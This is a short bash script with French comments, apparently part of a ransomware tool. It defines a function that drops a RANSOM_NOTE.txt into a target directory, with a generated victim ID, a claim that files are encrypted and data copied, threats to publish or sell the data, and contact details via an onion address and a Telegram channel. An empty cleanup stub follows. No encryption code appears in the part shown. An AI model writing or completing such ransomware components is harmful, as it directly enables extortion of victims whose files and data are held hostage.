#!/bin/bash

#fonction creation note
create_ransom_note() {

    # generation d'un identifiant aleatoire
    #id=$(uuidgen)   peut ne pas fonctionner sur tout les sytemes
    id=$(date +%s%N | sha256sum | head -c 16)
    # creation du fichier RANSOM_NOTE.txt dans le repertoire
    cat <<EOF > "$1/RANSOM_NOTE.txt"
===================== IMPORTANT NOTICE =====================

ID: $id

Your files have been encrypted.
Some sensitive data may also have been copied from your systems.

Do NOT try to rename, move, or modify the encrypted files.
Using recovery tools or third-party software may permanently damage them.

To restore access to your files and prevent further data exposure,
you must contact us using the information below.

Contact:
Onion Site: http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqb4nx6cmod3emy7sad.onion/contact
Telegram Channel: https://t.me/dib

If we do not hear from you within a few days, the data may be published
or sold to third parties.

=============================================================
EOF
}

cleanup() {
    : #jai pas de fichier temporaire
}